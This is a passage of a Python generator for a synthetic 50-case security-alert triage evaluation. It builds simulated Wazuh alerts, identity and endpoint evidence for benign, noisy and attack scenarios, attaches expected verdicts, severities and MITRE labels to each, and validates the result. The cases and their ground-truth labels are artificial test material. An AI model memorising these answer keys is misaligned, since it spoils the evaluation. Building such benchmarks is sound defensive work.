            f"Shadow copy deletion and a rapid file rewrite were observed on {hostname} "
            f"after a privileged sign-in by {username}."
            + (" Bulk encryption-like file creation followed." if encryption else "")
        ),
        severity="critical",
        verdict="true_positive",
        action="contain",
        alerts=alerts,
        identity=_identity(profiles, logins, risks),
        edr=edr,
        difficulty=_difficulty(number, hard=True),
        mitre=["T1490", "T1486", "T1053.005"],
        notes=f"variant={number}; os={os_name}; encryption={encryption}; "
              f"shadow_delete={shadow_delete}",
    )


# ---------------------------------------------------------------------------
# scenario builders: benign / noisy
# ---------------------------------------------------------------------------

def _benign(number: int, rng: random.Random, case_time: datetime) -> Dict[str, Any]:
    scenario = BENIGN_SCENARIOS[number]
    agent = AGENTS["windows"] if number in (1, 5, 9) else (
        AGENTS["kali"] if number in (0, 2, 7) else AGENTS["ubuntu"]
    )
    username = rng.choice([u for u in USERNAMES if u != "labtester"])
    start = _at(case_time, minutes=rng.randint(0, 50))
    endpoint_id = "ep-001" if agent["id"] == "008" else (
        "ep-002" if agent["id"] == "002" else "ep-004"
    )
    hostname = agent["name"].lower().replace(" ", "-")
    endpoint_ip = agent["ip"]
    os_name = "windows" if agent["id"] == "007" else "linux"
    alerts: List[WazuhAlert] = []
    processes: List[Dict[str, Any]] = []
    networks: List[Dict[str, Any]] = []
    files: List[Dict[str, Any]] = []
    profiles = [_profile(9, username, role="analyst", department="Engineering",
                         privilege_level=2, mfa_enabled=True, city="London")]
    logins: List[Dict[str, Any]] = []
    risks: List[Dict[str, Any]] = []
    severity = "low"
    verdict = "benign"
    mitre: List[str] = []
    title = ""
    summary = ""
    notes = f"variant={number}; scenario={scenario}"

    if scenario == "authorized_password_change":
        alerts = [
            _alert(start, agent,
                   _rule("5402", 3, "Successful sudo command execution",
                         ["sudo", "syslog", "privilege_escalation"]),
                   data={"srcip": agent["ip"], "dstuser": "root", "srcuser": username},
                   full_log=f"{username} : COMMAND=/usr/bin/passwd {username}",
                   location="/var/log/auth.log"),
            _alert(start + timedelta(seconds=40), agent,
                   _rule("550", 7, "File integrity checksum changed",
                         ["syscheck", "linux", "integrity"]),
                   data={"file": "/etc/shadow", "event": "modified"},
                   full_log="Integrity checksum changed: /etc/shadow",
                   location="syscheck"),
            _alert(start + timedelta(seconds=60), agent,
                   _rule("5501", 3, "PAM: Login session opened",
                         ["pam", "syslog", "authentication_success"]),
                   data={"srcip": agent["ip"], "dstuser": username},
                   full_log=f"pam_unix(sshd:session): session opened for user {username}",
                   location="/var/log/auth.log"),
        ]
        profiles[0]["scenario"] = "authorized-maintenance"
        logins = [_login(1, 9, start, agent["ip"], success=True,
                         auth_method="MFA", user_agent="Chrome/120")]
        processes = [_process(1, endpoint_id, start, "passwd",
                              f"/usr/bin/passwd {username}", user="root",
                              parent_name="sudo")]
        title = "Scheduled credential maintenance on a monitored endpoint"
        summary = (f"A password change for {username} was followed by an /etc/shadow "
                   f"integrity event on {agent['name']}.")

    elif scenario == "windows_update_service":
        alerts = [
            _alert(start, agent,
                   _rule("61104", 3, "Windows: Service startup type changed (event 7040)",
                         ["windows", "windows_system", "service"]),
                   data={"win": {"system": {"eventID": "7040", "channel": "System"},
                                 "eventdata": {"serviceName": "BITS",
                                               "startType": "demand start"}}},
                   full_log=None, location="EventChannel"),
            _alert(start + timedelta(minutes=1), agent,
                   _rule("60642", 3, "Windows: Software protection service scheduled",
                         ["windows", "windows_application"]),
                   data={"win": {"system": {"eventID": "16384",
                                            "channel": "Application"}}},
                   full_log=None, location="EventChannel"),
            _alert(start + timedelta(minutes=2), agent,
                   _rule("61110", 10, "Windows: DCOM server time-out (event 10010)",
                         ["windows", "windows_system"]),
                   data={"win": {"system": {"eventID": "10010", "channel": "System"}}},
                   full_log=None, location="EventChannel"),
        ]
        verdict = "false_positive"
        title = "Windows update and service maintenance activity"
        summary = ("Service startup changes and a DCOM time-out were observed during a "
                   "scheduled update window on the endpoint.")
        processes = [_process(1, endpoint_id, start, "svchost.exe",
                              "C:\\Windows\\System32\\svchost.exe -k netsvcs",
                              user="NT AUTHORITY\\SYSTEM", parent_name="services.exe")]

    elif scenario == "routine_admin_ssh":
        alerts = [
            _alert(start, agent,
                   _rule("5715", 3, "sshd: Successful login",
                         ["syslog", "sshd", "authentication_success"]),
                   data={"srcip": "10.11.1.50", "dstuser": "labtester"},
                   full_log="Accepted publickey for labtester from 10.11.1.50 port 51022 ssh2",
                   location="/var/log/auth.log"),
            _alert(start + timedelta(seconds=1), agent,
                   _rule("5501", 3, "PAM: Login session opened",
                         ["pam", "syslog", "authentication_success"]),
                   data={"srcip": "10.11.1.50", "dstuser": "labtester"},
                   full_log="pam_unix(sshd:session): session opened for user labtester",
                   location="/var/log/auth.log"),
            _alert(start + timedelta(minutes=3), agent,
                   _rule("5502", 3, "PAM: Login session closed",
                         ["pam", "syslog"]),
                   data={"srcip": "10.11.1.50", "dstuser": "labtester"},
                   full_log="pam_unix(sshd:session): session closed for user labtester",
                   location="/var/log/auth.log"),
        ]
        profiles = [_profile(10, "labtester", role="admin", department="IT",
                             privilege_level=5, mfa_enabled=False, city="London")]
        logins = [_login(1, 10, start, "10.11.1.50", success=True,
                         auth_method="publickey", user_agent="OpenSSH_9.6")]
        processes = [_process(1, endpoint_id, start, "sshd", "/usr/sbin/sshd -D",
                              user="root", parent_name="systemd")]
        title = "Interactive administrator session from the management network"
        summary = ("An administrator authenticated with a key from the management "
                   f"network and opened a short session on {agent['name']}.")

    elif scenario == "sca_failure_summary":
        alerts = [
            _alert(start, agent,
                   _rule("19005", 9, "SCA summary: score below policy threshold",
                         ["sca", "windows"]),
                   data={"sca": {"check": {"result": "failed"},
                                 "score": 27, "policy": "CIS Microsoft Windows 10 Enterprise"}},
                   full_log=None, location="sca"),
            _alert(start + timedelta(seconds=2), agent,
                   _rule("19007", 7, "SCA: CIS check failed",
                         ["sca", "windows"]),
                   data={"sca": {"check": {"result": "failed", "id": 1,
                                           "title": "Ensure guest account is renamed"}}},
                   full_log=None, location="sca"),
            _alert(start + timedelta(seconds=4), agent,
                   _rule("19007", 7, "SCA: CIS check failed",
                         ["sca", "windows"]),
                   data={"sca": {"check": {"result": "failed", "id": 2,
                                           "title": "Ensure LAN Manager authentication level"}}},
                   full_log=None, location="sca"),
        ]
        severity = "medium"
        title = "Configuration assessment score below policy threshold"
        summary = ("A configuration assessment completed with a score of 27 percent and "
                   "two failed checks on the Windows endpoint.")
        processes = []

    elif scenario == "vulnerability_scan":
        alerts = [
            _alert(start + timedelta(seconds=i), agent,
                   _rule("23504", 7, "Vulnerability detector: CVE detected",
                         ["vulnerability-detector", "windows"]),
                   data={"vulnerability": {"cve": cve, "severity": "Medium",
                                           "package": {"name": "gimp"},
                                           "status": "Active"}},
                   full_log=None, location="vulnerability-detector")
            for i, cve in enumerate(["CVE-2026-82328", "CVE-2026-78475", "CVE-2026-79902"])
        ]
        title = "Scheduled vulnerability inventory results"
        summary = ("A routine vulnerability scan reported three medium-severity findings "
                   "in an installed image package.")

    elif scenario == "dcom_timeout_noise":
        alerts = [
            _alert(start + timedelta(seconds=i * 5), agent,
                   _rule("61110", 10, "Windows: DCOM server time-out (event 10010)",
                         ["windows", "windows_system"]),
                   data={"win": {"system": {"eventID": "10010", "channel": "System"}}},
                   full_log=None, location="EventChannel")
            for i in range(3)
        ]
        verdict = "false_positive"
        title = "Repeated DCOM server time-out events"
        summary = ("Three DCOM server time-out events were recorded while the endpoint "
                   "was idle.")

    elif scenario == "updater_service_install":
        alerts = [
            _alert(start, agent,
                   _rule("61138", 5, "Windows: New service created (event 7045)",
                         ["windows", "windows_system", "service"]),
                   data={"win": {"system": {"eventID": "7045", "channel": "System"},
                                 "eventdata": {"serviceName": "GoogleUpdater",
                                               "imagePath": "C:\\Program Files\\Google\\updater.exe"}}},
                   full_log=None, location="EventChannel"),
            _alert(start + timedelta(seconds=1), agent,
                   _rule("61138", 5, "Windows: New service created (event 7045)",
                         ["windows", "windows_system", "service"]),
                   data={"win": {"system": {"eventID": "7045", "channel": "System"},
                                 "eventdata": {"serviceName": "GoogleUpdater",
                                               "imagePath": "C:\\Program Files\\Google\\updater.exe"}}},
                   full_log=None, location="EventChannel"),
        ]
        verdict = "false_positive"
        title = "Software updater service installation"
        summary = ("Two service-creation events were recorded for a signed software "
                   "updater during an installation.")

    elif scenario == "backup_job":
        alerts = [
            _alert(start, agent,
                   _rule("550", 7, "File integrity checksum changed",
                         ["syscheck", "linux", "integrity"]),
                   data={"file": "/srv/backup/catalog.db", "event": "modified"},
                   full_log="Integrity checksum changed: /srv/backup/catalog.db",
                   location="syscheck"),
            _alert(start + timedelta(seconds=30), agent,
                   _rule("5501", 3, "PAM: Login session opened",
                         ["pam", "syslog", "authentication_success"]),
                   data={"srcip": agent["ip"], "dstuser": "backup"},
                   full_log="pam_unix(cron:session): session opened for user backup",
                   location="/var/log/auth.log"),
        ]
        profiles = [_profile(11, "backup", role="service", department="IT",
                             privilege_level=4, mfa_enabled=False, city="London")]
        processes = [_process(1, endpoint_id, start, "rsync",
                              "rsync -a /data/ /srv/backup/", user="backup",
                              parent_name="cron")]
        title = "Nightly backup job modified the catalog"
        summary = ("A scheduled backup job changed the backup catalog and opened a "
                   "service session on the host.")

    elif scenario == "new_city_mfa_login":
        alerts = [
            _alert(start, agent,
                   _rule("5715", 3, "sshd: Successful login",
                         ["syslog", "sshd", "authentication_success"]),
                   data={"srcip": "10.11.24.15", "dstuser": username},
                   full_log=f"Accepted password for {username} from 10.11.24.15",
                   location="/var/log/auth.log"),
            _alert(start + timedelta(seconds=1), agent,
                   _rule("5501", 3, "PAM: Login session opened",
                         ["pam", "syslog", "authentication_success"]),
                   data={"srcip": "10.11.24.15", "dstuser": username},
                   full_log=f"pam_unix(sshd:session): session opened for user {username}",
                   location="/var/log/auth.log"),
        ]
        logins = [_login(1, 9, start, "10.11.24.15", country="US", city="New York",
                         success=True, auth_method="MFA", user_agent="Chrome/120")]
        risks = [_risk("new_location", "low",
                       "First sign-in from New York in the last 30 days; MFA satisfied")]
        title = "Successful sign-in from a new city with MFA"
        summary = (f"{username} signed in from a new city with MFA satisfied; no "
                   "follow-on activity was observed.")

    elif scenario == "typo_failures_then_success":
        alerts = [
            _alert(start, agent,
                   _rule("5760", 5, "sshd: Failed password for a valid user",
                         ["syslog", "sshd", "authentication_failed"]),
                   data={"srcip": "10.11.21.12", "dstuser": username},
                   full_log=f"Failed password for {username} from 10.11.21.12",
                   location="/var/log/auth.log", firedtimes=1),
            _alert(start + timedelta(seconds=8), agent,
                   _rule("5760", 5, "sshd: Failed password for a valid user",
                         ["syslog", "sshd", "authentication_failed"]),
                   data={"srcip": "10.11.21.12", "dstuser": username},
                   full_log=f"Failed password for {username} from 10.11.21.12",
                   location="/var/log/auth.log", firedtimes=2),
            _alert(start + timedelta(seconds=20), agent,
                   _rule("5715", 3, "sshd: Successful login",
                         ["syslog", "sshd", "authentication_success"]),
                   data={"srcip": "10.11.21.12", "dstuser": username},
                   full_log=f"Accepted password for {username} from 10.11.21.12",
                   location="/var/log/auth.log"),
        ]
        logins = [
            _login(1, 9, start, "10.11.21.12", country="FR", city="Paris",
                   success=False, auth_method="password", user_agent="OpenSSH_9.6"),
            _login(2, 9, start + timedelta(seconds=8), "10.11.21.12", country="FR",
                   city="Paris", success=False, auth_method="password",
                   user_agent="OpenSSH_9.6"),
            _login(3, 9, start + timedelta(seconds=20), "10.11.21.12", country="FR",
                   city="Paris", success=True, auth_method="password",
                   user_agent="OpenSSH_9.6"),
        ]
        title = "Two mistyped passwords followed by a successful sign-in"
        summary = (f"Two failed password attempts for {username} were followed by a "
                   "successful sign-in from the same address.")

    else:  # pragma: no cover - BENIGN_SCENARIOS is fixed
        raise ValueError(f"unknown benign scenario: {scenario}")

    return _parts(
        scenario=scenario,
        title=title,
        summary=summary,
        severity=severity,
        verdict=verdict,
        action="monitor",
        alerts=alerts,
        identity=_identity(profiles, logins, risks),
        edr=_edr(
            [_endpoint(endpoint_id, hostname, os_name, endpoint_ip,
                       ["windows" if os_name == "windows" else "linux", "workstation"],
                       "normal")],
            processes=processes,
            networks=networks,
            files=files,
        ),
        difficulty="easy" if number % 2 == 0 else "medium",
        mitre=mitre,
        notes=notes,
    )


BUILDERS: Dict[str, Callable[[int, random.Random, datetime], Dict[str, Any]]] = {
    "credential_stuffing": _credential_stuffing,
    "brute_force": _brute_force,
    "phishing": _phishing,
    "ransomware_precursor": _ransomware_precursor,
    "benign": _benign,
}


# ---------------------------------------------------------------------------
# assembly + validation
# ---------------------------------------------------------------------------

def _parse_ts(value: Optional[str]) -> Optional[datetime]:
    if not value:
        return None
    try:
        parsed = datetime.fromisoformat(value.replace("Z", "+00:00"))
    except ValueError:
        return None
    if parsed.tzinfo is None:
        parsed = parsed.replace(tzinfo=UTC)
    return parsed


def _siem_evidence(alerts: List[WazuhAlert], trigger: WazuhAlert) -> SIEMEvidence:
    rule_counts: Counter = Counter()
    source_ips = set()
    target_users = set()
    successful_logins = 0
    timestamps: List[datetime] = []

    for alert in alerts:
        if alert.rule and alert.rule.id:
            rule_counts[str(alert.rule.id)] += 1
            if str(alert.rule.id) in SUCCESS_RULE_IDS:
                successful_logins += 1
        data = alert.data or {}
        src = data.get("srcip")
        if not src and isinstance(data.get("win"), dict):
            eventdata = data["win"].get("eventdata") or {}
            src = eventdata.get("ipAddress")
        if src:
            source_ips.add(str(src))
        user = data.get("dstuser")
        if not user and isinstance(data.get("win"), dict):
            eventdata = data["win"].get("eventdata") or {}
            user = eventdata.get("targetUserName")
        if user:
            target_users.add(str(user))
        parsed = _parse_ts(alert.timestamp)
        if parsed:
            timestamps.append(parsed)

    first = min(timestamps) if timestamps else None
    last = max(timestamps) if timestamps else None
    burst_seconds = (last - first).total_seconds() if first and last else 0.0
    window = f"{_iso(first)} -> {_iso(last)}" if first and last else ""

    return SIEMEvidence(
        trigger_rule_id=str(trigger.rule.id) if trigger.rule else "",
        trigger_level=int(trigger.rule.level) if trigger.rule else 0,
        correlated_alert_count=len(alerts),
        rule_counts=dict(sorted(rule_counts.items())),
        source_ips=sorted(source_ips),
        target_users=sorted(target_users),
        burst_seconds=burst_seconds,
        successful_logins=successful_logins,
        observation_window=window,
    )


def _assemble(
    *,
    case_index: int,
    number: int,
    label: str,
    dataset_id: str,
    parts: Dict[str, Any],
) -> EvalCase:
    case_id = f"EVAL-{LABEL_PREFIX[label]}-{number + 1:03d}"
    alerts = sorted(
        parts["alerts"],
        key=lambda a: (_parse_ts(a.timestamp) or BASE_TIME, a.rule.level if a.rule else 0),
    )
    if not 1 <= len(alerts) <= 8:
        raise ValueError(f"{case_id}: expected 1-8 alerts, got {len(alerts)}")
    for i, alert in enumerate(alerts, start=1):
        alert.id = f"{case_id}-A{i:02d}"

    trigger = max(
        alerts,
        key=lambda a: (a.rule.level if a.rule else 0, _parse_ts(a.timestamp) or BASE_TIME),
    )

    expected_mitre = list(parts["mitre"]) or list(MITRE_BY_LABEL[label])
    return EvalCase(
        case_id=case_id,
        dataset_id=dataset_id,
        case_index=case_index,
        label=label,
        is_malicious=label != "benign",
        expected_severity=parts["severity"],
        expected_verdict=parts["verdict"],
        expected_action=parts["action"],
        expected_mitre=expected_mitre,
        difficulty=parts["difficulty"],
        scenario=parts["scenario"],
        title=parts["title"],
        summary=parts["summary"],
        trigger_alert_id=str(trigger.id),
        alerts=alerts,
        identity=parts["identity"],
        edr=parts["edr"],
        siem=_siem_evidence(alerts, trigger),
        notes=parts["notes"],
    )


def generate_dataset(
    seed: int = DEFAULT_SEED,
    dataset_id: str = DEFAULT_DATASET_ID,
) -> List[EvalCase]:
    """Build the deterministic 50-case dataset (10 cases per label)."""
    cases: List[EvalCase] = []
    for label_index, label in enumerate(LABELS):
        builder = BUILDERS[label]
        for number in range(CASES_PER_LABEL):
            case_index = label_index * CASES_PER_LABEL + number
            rng = random.Random(seed + case_index * 7919)
            case_time = BASE_TIME + timedelta(days=case_index)
            parts = builder(number, rng, case_time)
            cases.append(_assemble(
                case_index=case_index,
                number=number,
                label=label,
                dataset_id=dataset_id,
                parts=parts,
            ))
    return cases


def validate_dataset(cases: Sequence[EvalCase]) -> Dict[str, Any]:
    """Raise ``ValueError`` if the dataset violates the ground-truth contract."""
    if len(cases) != len(LABELS) * CASES_PER_LABEL:
        raise ValueError(
            f"expected {len(LABELS) * CASES_PER_LABEL} cases, got {len(cases)}"
        )

    labels = Counter(case.label for case in cases)
    for label in LABELS:
        if labels.get(label) != CASES_PER_LABEL:
            raise ValueError(
                f"expected {CASES_PER_LABEL} cases for {label}, got {labels.get(label)}"
            )

    case_ids = set()
    total_alerts = 0
    for case in cases:
        if case.case_id in case_ids:
            raise ValueError(f"duplicate case_id: {case.case_id}")
        case_ids.add(case.case_id)

        if case.label not in LABELS:
            raise ValueError(f"{case.case_id}: unknown label {case.label}")
        if case.is_malicious != (case.label != "benign"):
            raise ValueError(f"{case.case_id}: is_malicious does not match label")
        if case.expected_severity not in SEVERITIES:
            raise ValueError(f"{case.case_id}: bad severity {case.expected_severity}")
        if case.expected_verdict not in VERDICTS:
            raise ValueError(f"{case.case_id}: bad verdict {case.expected_verdict}")
        if case.expected_action not in ACTIONS:
            raise ValueError(f"{case.case_id}: bad action {case.expected_action}")
        if case.difficulty not in DIFFICULTIES:
            raise ValueError(f"{case.case_id}: bad difficulty {case.difficulty}")

        if not 1 <= len(case.alerts) <= 8:
            raise ValueError(f"{case.case_id}: {len(case.alerts)} alerts (expected 1-8)")
        total_alerts += len(case.alerts)

        if case.trigger_alert() is None:
            raise ValueError(f"{case.case_id}: trigger_alert_id is not in alerts")
        highest = max(
            (alert.rule.level if alert.rule else 0) for alert in case.alerts
        )
        trigger = case.trigger_alert()
        if trigger is None or (trigger.rule.level if trigger.rule else 0) != highest:
            raise ValueError(f"{case.case_id}: trigger is not the highest-level alert")

        prose = f"{case.title} {case.summary}".lower()
        for term in FORBIDDEN_PROSE_TERMS:
            if term in prose:
                raise ValueError(
                    f"{case.case_id}: generated prose leaks ground truth: {term!r}"
                )

        if not case.identity.profiles:
            raise ValueError(f"{case.case_id}: missing identity evidence")
        if not case.edr.endpoints:
            raise ValueError(f"{case.case_id}: missing endpoint evidence")
        if case.siem.correlated_alert_count != len(case.alerts):
            raise ValueError(f"{case.case_id}: SIEM evidence does not match alerts")

    return {
        "dataset_id": cases[0].dataset_id,
        "case_count": len(cases),
        "alert_count": total_alerts,
        "label_counts": dict(labels),
        "malicious": sum(1 for case in cases if case.is_malicious),
        "benign": sum(1 for case in cases if not case.is_malicious),
    }
